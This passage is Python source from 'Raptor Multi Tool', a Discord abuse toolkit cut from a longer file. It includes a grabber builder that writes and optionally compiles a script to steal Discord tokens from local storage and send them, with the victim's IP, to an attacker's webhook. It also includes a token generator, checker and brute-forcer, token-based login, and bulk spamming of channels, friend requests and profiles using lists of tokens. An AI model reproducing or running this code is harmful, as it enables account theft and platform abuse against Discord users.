      r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt')
      r2 = requests.get('https://api.openproxylist.xyz/http.txt')
      proxies.write(r1.content)
      proxies.write(r2.content)
      num = 0
      for lines in r1.iter_lines():
        num += 1
      num2 = 0
      for lines in r2.iter_lines():
        num2 += 1
      length1 = num2 + num
      print(Fore.GREEN + f"   Done! Successfully added {length1} proxies, Check where this file is located.")
      proxies.close()
    
    elif typeproxy == 2:
      out_file = "Socks4 Proxies.txt"
      proxies = open(out_file,'wb')
      r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt')
      r2 = requests.get('https://api.openproxylist.xyz/socks4.txt')
      proxies.write(r1.content)
      proxies.write(r2.content)
      num = 0
      for lines in r1.iter_lines():
        num += 1
      num2 = 0
      for lines in r2.iter_lines():
        num2 += 1
      length1 = num2 + num
      print(Fore.GREEN + f"   Done! Successfully added {length1} proxies, Check where this file is located.")
      proxies.close()

    elif typeproxy == 3:
      r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt')
      r2 = requests.get('https://api.openproxylist.xyz/socks5.txt')
      out_file = "Socks5 Proxies.txt"
      proxies = open(out_file,'wb')
      proxies.write(r1.content)
      proxies.write(r2.content)
      num = 0
      for lines in r1.iter_lines():
        num += 1
      num2 = 0
      for lines in r2.iter_lines():
        num2 += 1
      length1 = num2 + num
      print(Fore.GREEN + f"   Done! Successfully added {length1} proxies, Check where this file is located.")
      proxies.close()
    else:
      print("Invalid Option")
  
  global tokengen
  def tokengen():

    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Token Generator")
    print(f"""
{Fore.MAGENTA}  _____     _                 ____            
 |_   _|__ | | _____ _ __    / ___| ___ _ __  
   | |/ _ \| |/ / _ \ '_ \  | |  _ / _ \ '_ \     
   {Fore.RED}| | (_) |   <  __/ | | | | |_| |  __/ | | |
   |_|\___/|_|\_\___|_| |_|  \____|\___|_| |_|
                                             
    """)

    howmany111 = int(input("[>] How many tokens to generate: "))

    fileask = input("Do you want to output to a text file?: ").lower()


    chars = string.ascii_letters + string.digits

    if fileask in yeslist:
      token = []
      for i in range(howmany111):
        a = "".join(random.choice(chars) for x in range(20))
        b = "".join(random.choice(chars) for x in range(6))
        c = "".join(random.choice(chars) for x in range(27))

        result = "OTIw" + a + '.' + b + '.' + c
        file = open("gennedTokens.txt", 'a')
        file.write(result + '\n')
        token.append(result)
      print(Fore.BLUE + "All tokens are random characters.")

      checktoken = input('Do you want to check the tokens?: ')
      if checktoken in yeslist:
        with open('gennedTokens.txt','a') as tokenfile:
          valid = 0
          invalid = 0
          for x in range(len(token)):
            header = {
              "authority": "discord.com",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{token[x]}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
              } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.GREEN}[+] Valid {token[x]}' )
                valid += 1
                tokenfile.write(token[x] + '\n')
            else:
                print(f'\033[31m[-] Invalid {token[x]}', )
                invalid += 1

          print(f'{Fore.BLUE}There are {valid} valid tokens and {invalid} invalid tokens')
      print(Fore.GREEN + "Finished! Check where the file is located.")
      file.close() 

    elif fileask in nolist:
      token = []
      for i in range(howmany111):
        a = "".join(random.choice(chars) for x in range(20))
        b = "".join(random.choice(chars) for x in range(6))
        c = "".join(random.choice(chars) for x in range(27))


        tokens = "OTIw" + a + "." + b + "." + c
        token.append(tokens)
        print(Fore.GREEN + tokens)
      print(Fore.BLUE + "All tokens are random characters.")
      checktoken = input(Fore.RED + 'Do you want to check the tokens?: ')
      if checktoken in yeslist:
        with open('gennedTokens.txt','a') as tokenfile:
          valid = 0
          invalid = 0
          for x in range(len(token)):
            header = {
              "authority": "discord.com",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{token[x]}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
              } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.GREEN} [+] Valid {token[x]}' )
                valid += 1
            else:
                print(f'\033[31m [-] Invalid {token[x]}', )
                invalid += 1

          print(f'{Fore.BLUE} There are {valid} valid tokens and {invalid} invalid tokens')

    else:
      print("Invalid Option")

  def login():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Token Login") 
    print(f'''
{Fore.MAGENTA}  _                _       
 | |    ___   __ _(_)_ __  
 | |   / _ \ / _` | | '_ |
{Fore.RED} | |__| (_) | (_| | | | | |
 |_____\___/ \__, |_|_| |_|
             |___/    
  {Fore.BLUE}                 
    ''')

    token = input('What is the token you want to log in with?: ')
    directory = input("What is the directory with your chrome driver (Check inside of this folder): ")

    chromedriver = f'{directory}/chromedriver.exe'

    driver = webdriver.Chrome(chromedriver)

    driver.set_window_size(1800,1800)

    URL = 'https://discord.com/login/'
    driver.get(URL)


    message = '''
    function login(token) {
    setInterval(() => {
    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
    }, 50);
    setTimeout(() => {
    location.reload();
    }, 2500);
    }

    login("''' + token + '''")
    '''
    driver.execute_script(message)

    time.sleep(10)
    cls()
    print('To close the browser')
    os.system('pause')
  
  def credits():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Credits")
    print(Fore.MAGENTA + '''
   ____              _ _ _       
  / ___|_ __ ___  __| (_) |_ ___ 
 | |   | '__/ _ \/ _` | | __/ __|
 \033[31m| |___| | |  __/ (_| | | |_\__ \ 
  \____|_|  \___|\__,_|_|\__|___/
                                    
    ''')
    By = Fore.LIGHTBLACK_EX + 'Raptor was made by People below | Skidders not on top <3'
    Aran = Fore.MAGENTA + '! Aran#9999'
    Tkn = Fore.RED + 'tkn#0908'
    Vivid = Fore.CYAN + 'vivid#9541'

    for chars in By:
      sys.stdout.write(chars)
      sys.stdout.flush()
      time.sleep(0.07)
    print('\n')
    for chars in Aran:
      sys.stdout.write(chars)
      sys.stdout.flush()
      time.sleep(0.1)
    print('\n')
    for chars in Tkn:
      sys.stdout.write(chars)
      sys.stdout.flush()
      time.sleep(0.1)
    print('\n')
    for chars in Vivid:
      sys.stdout.write(chars)
      sys.stdout.flush()
      time.sleep(0.1)
    print('\n')

  def discordserver():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Join The Discord Server")
    print(f'''
{Fore.MAGENTA}  ____  _                       _  
 |  _ \(_)___  ___ ___  _ __ __| | 
 | | | | / __|/ __/ _ \| '__/ _` |
{Fore.RED} | |_| | \__ \ (_| (_) | | | (_| | 
 |____/|_|___/\___\___/|_|  \__,_| 
                                  
    ''')  
    whichserver = int(input('''
  Which Discord Server do you want to join?
  [1] Aran's Discord (OptiTokens)
  [2] Vivid's Discord (Webass)

  [?>]'''))


    if whichserver == 1:
      webbrowser.open('https://discord.gg/tVxm49wzvz')
    elif whichserver == 2:
      webbrowser.open('https://discord.gg/rekT723zrz')
    else:
      print("Invalid Option.")

  global grabber
  def grabber():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Token & Ip Grabber") 
      print(f'''
{Fore.MAGENTA}   ____           _     _               
  / ___|_ __ __ _| |__ | |__   ___ _ __ 
 | |  _| '__/ _` | '_ \| '_ \ / _ \ '__|
{Fore.RED} | |_| | | | (_| | |_) | |_) |  __/ |   
  \____|_|  \__,_|_.__/|_.__/ \___|_|   
  {Fore.GREEN}                                          
      ''')
      hooklink = input("What is the webhook link you want to send the info to?: ")
      filename = input("What do you want the grabber to be named?: " )
      filename.replace('.py','')

      file = open(filename + '.py','w')
      grabbingcode = '''
import os
import requests
from re import findall
from json import loads, dumps
from urllib.request import Request, urlopen
web1 = "''' + hooklink + '''"
lc = os.getenv("LOCALAPPDATA")
rm = os.getenv("APPDATA")
PATHS = {
    "Discord": rm + "\\\\Discord",
    "Discord Canary": rm + "\\\\discordcanary",
    "Discord PTB": rm + "\\\\discordptb",
    "Google Chrome": lc + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Opera": rm + "\\\\Opera Software\\\\Opera Stable"
}
def header(token=None):
    headers = {
        "Content-Type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def da(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=header(token))).read().decode())
    except:
        pass
def tukan(path):
    path += "\\\\Local Storage\\\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def grabber():
    em = []
    em1 = []
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in tukan(path):
            if token in checked:
                continue
            checked.append(token)
            user_data = da(token)
            if not user_data:
                continue
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            emb = {
                "fields": [
                        {
                            "name": "Token",
                            "value": token,
                            "inline": False
                        }
                ],
                "author": {
                    "name": f"{username} ",
                },
            }
            em.append(emb)

    ip = requests.get('https://api.ipify.org?format=json')
    global ipv4
    ipv4 = ip.json()["ip"]
    emb1 = {
    "fields": [
            {
                "name": "IP",
                "value": ipv4,
                "inline": False
            }
    ],
    "author": {
        "name": "Raptor Multi Tool",
        },
    }
    em1.append(emb1)


    webhook = {
        "content": "",
        "embeds": em,
        "username": "TOKENS DROP"
    }

    webhook1 = {
        "content": "",
        "embeds": em1,
        "username": "IP"
    }

    try:
        urlopen(Request(web1, data=dumps(webhook).encode(), headers=header()))
        urlopen(Request(web1, data=dumps(webhook1).encode(), headers=header()))
    except:
        pass
if __name__ == '__main__':
    grabber()
    '''
      file.write(grabbingcode)
      file.flush()
      file.close()
      print('Done!')
      exe = input("Do you want to make the grabber an exe?: ")
      exename = filename + '.py'
      if exe in yeslist:
        os.system(f'pyinstaller --onefile -i NONE {exename}')
        cls()
        print(f'{Fore.RESET}Done! Look Inside of the new folder named {Fore.GREEN} DIST {Fore.RESET} to find {filename}.exe')

  global youtube
  def youtube():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Subscribe!")
    print(f'''
{Fore.MAGENTA} __   __         _____      _           
 \ \ / /__  _   |_   _|   _| |__   ___  
  \ V / _ \| | | || || | | | '_ \ / _ \ 
{Fore.RED}   | | (_) | |_| || || |_| | |_) |  __/ 
   |_|\___/ \__,_||_| \__,_|_.__/ \___| 
                                        
    ''')
    webbrowser.open('https://www.youtube.com/c/Landen666')

  global bruteforce
  def bruteforce():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Token bruteforcer")
    print(f'''
{Fore.MAGENTA}  ____             _       _____                       
 | __ ) _ __ _   _| |_ ___|  ___|__  _ __ ___ ___ _ __ 
 |  _ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \ '__| 
{Fore.RED} | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/ |   
 |____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|_|   

{Fore.YELLOW} If it stops just click Enter on your keyboard
{Fore.RED}                                                    
    ''')
    global id_to_token
    id_to_token = base64.b64encode((input(" What is the User's ID?: ")).encode("ascii"))
    id_to_token = str(id_to_token)[2:-1]

    def bruting():
      while True:
        pyautogui.press('enter')
        time.sleep(0.05)
        token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=25))
        headers={
          'Authorization': token
        }
        login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
        try:
          if login.status_code == 200:
            print('\033[32' + ' [+] VALID' + ' ' + token)
            f = open('VALID.txt', "a+")
            f.write(f'{token}\n')
            break
          else:
            print('[-] INVALID' + ' ' + token) 
        finally:
          print("")
        input()

    threads = []
    for i in range(3):
      t = threading.Thread(target=bruting)
      t.daemon = True
      t.start()
      threads.append(t)

    for threads in threads:
      t.join()

  def hypesquad():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Token Hypesquad Changer")
    url = 'https://discord.com/api/v9/hypesquad/online'

    house = int(input(f"""
    {Fore.MAGENTA} _   _                                             _  
    | | | |_   _ _ __   ___  ___  __ _ _   _  __ _  __| | 
    | |_| | | | | '_ \ / _ \/ __|/ _` | | | |/ _` |/ _` | 
    {Fore.RED}|  _  | |_| | |_) |  __/\__ \ (_| | |_| | (_| | (_| | 
    |_| |_|\__, | .__/ \___||___/\__, |\__,_|\__,_|\__,_| 
            |___/|_|                 |_|                  
    {Fore.BLUE}
    [1] BRAVERY
    [2] BRILLIANCE
    [3] BALANCE
    [4] RANDOM
    [5] LEAVE ALL HYPESQUADS

    [\>]"""))

    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }
        if house == 1 or 2 or 3:
            payload = {
                'house_id':house
            }

            r = requests.post(url, headers=header, json=payload)
            if r.status_code == 200 or 204:
                print(f"{Fore.GREEN}    Done!")
            else:
                print(r)

        if house == 5:
            payload1 = {
                'house_id':'None'
            }

            t = requests.delete(url, headers=header, json=payload1)

        if house == 4:
            num = random.randint(1,3)

            payload2 = {
                'house_id':num
            }

            r = requests.post(url, headers=header, json=payload2)
            if r.status_code == 200 or 204:
                print(f"{Fore.GREEN}    Done!")
            else:
                print(r)

  def friends():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Friend Spammer")
    url = 'https://discord.com/api/v9/users/@me/relationships'

    print(f'''
    {Fore.MAGENTA} _____     _                _   ____                        
    |  ___| __(_) ___ _ __   __| | / ___| _ __   __ _ _ __ ___  
    | |_ | '__| |/ _ \ '_ \ / _` | \___ \| '_ \ / _` | '_ ` _ \ 
    {Fore.RED}|  _|| |  | |  __/ | | | (_| |  ___) | |_) | (_| | | | | | |
    |_|  |_|  |_|\___|_| |_|\__,_| |____/| .__/ \__,_|_| |_| |_|
                                          |_|                    
    ''')

    discordname = input('What is the discord name + numbers?: ')
    name,num = discordname.split('#')


    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        payload = {
            "username":name,
            'discriminator':num
        }
        r = requests.post(url, headers=header, json=payload)
        if r.status_code == 204 or 200:
            print(f'{Fore.GREEN}Done!')
        else:
            print(r)
  def aboutthis():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("About this project")
    print(f'''
{Fore.MAGENTA}     _    _                 _   
    / \  | |__   ___  _   _| |_ 
   / _ \ | '_ \ / _ \| | | | __|
{Fore.RED}  / ___ \| |_) | (_) | |_| | |_ 
 /_/   \_\_.__/ \___/ \__,_|\__|
  {Fore.LIGHTBLUE_EX}   
  Hey, this was a project made for fun inspired by Raid-Tool-Box V2. 
  {Fore.RESET}{Fore.BLUE}Aran{Fore.RESET}{Fore.LIGHTBLUE_EX}  was the main coder of this project, thanks to {Fore.RESET}{Fore.BLUE}Vivid{Fore.RESET}{Fore.LIGHTBLUE_EX} for help with a couple functions, 
  thanks to {Fore.RESET}{Fore.BLUE}Tkn{Fore.RESET}{Fore.LIGHTBLUE_EX} for coming up with this idea.
  Took around 12 hours or so of coding combined and lots of debugging.
  Final thanks to all the testers that helped fix bugs that were in this program!
  Enjoy Raptor Multi Tool™!                       
    ''')

  def tokenspammer():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Server Spammer")
      chanid = input(f'''
{Fore.MAGENTA} ____       _     _           
|  _ \ __ _(_) __| | ___ _ __ 
| |_) / _` | |/ _` |/ _ \ '__|
{Fore.RED}|  _ < (_| | | (_| |  __/ |   
|_| \_\__,_|_|\__,_|\___|_|   
                                                                              
Channel ID: ''')
      message = input('Message: ')

      url = f'https://discord.com/api/v9/channels/{chanid}/messages'

      tokens = []
      token = []

      reversetoken = []
      with open('tokens.txt','r') as f:
          for line in f:
              tokens.append(line)

          for element in tokens:
              token.append(element.strip())

          length = len(token)

      for t in reversed(token):
        reversetoken.append(t)
      
      def spammer():
          for x in range(length):
              header = {
                  "authority": "discord.com",
                  "method": "POST",
                  "path": "/api/v9/users/@me",
                  "scheme": "https",
                  "accept": "*/*",
                  "accept-encoding": "gzip, deflate, br",
                  "accept-language": "en-US",
                  "Authorization": f"{token[x]}",
                  "content-length": "0",
                  "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                  "origin": "https://discord.com",
                  'referer': 'https://discord.com/channels/@me',
                  "sec-fetch-dest": "empty",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-site": "same-origin",
                  "user-agent": useragent(),
                  "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                  "x-debug-options": "bugReporterEnabled",
                  "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
              }

              r = requests.post(url, headers=header, json={'content':message})
              if r.status_code == 200 or 201:
                  print('Sent {}'.format(message))
              else:
                  print(r)

      def spammer2():
        for x in range(length):
          header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{reversetoken[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        r = requests.post(url, headers=header, json={'content':message})
        if r.status_code == 200 or 201:
            print('Sent {}'.format(message))
        else:
            print(r)
        
      while __name__ == '__main__':
        spammer()
        spammer2()

  def biochanger():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("About Me Changer")
    url = 'https://discord.com/api/v9/users/@me'

    abtoptions = input(f'''
    {Fore.MAGENTA}  ____  _          ____ _                                 
    | __ )(_) ___    / ___| |__   __ _ _ __   __ _  ___ _ __ 
    |  _ \| |/ _ \  | |   | '_ \ / _` | '_ \ / _` |/ _ \ '__|
    {Fore.RED} | |_) | | (_) | | |___| | | | (_| | | | | (_| |  __/ |   
    |____/|_|\___/   \____|_| |_|\__,_|_| |_|\__, |\___|_|   
                                              |___/     
    [01] CUSTOM BIO
    [02] RANDOM BIO
    [03] RAPTOR BIO 

    [\>]''')

    if abtoptions in ['01','1']:
        bio1 = input('What do you want the token about me to say?: ')
        payload1 = {
            'bio':bio1
        }

    elif abtoptions in ['02','2']:
        bio2 = input("What is the file with your about me's (Has to be in same directory): ")
        bioss = []
        with open(bio2,'r', encoding='utf-8') as bio:
            for line in bio:
                bioss.append(line)
        realbio = random.choice(bioss)
        payload2 = {
            'bio':realbio
        }

    elif abtoptions in ['03','3']:
        bio3 = 'Raptor Multi Tool On Top <3'
        payload3 = {
            'bio':bio3
        }

    else:
        print('Invalid Option')

    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        if abtoptions in ['01','1']:
            r = requests.patch(url, headers=header,json=payload1)
            if r.status_code == 200 or 204:
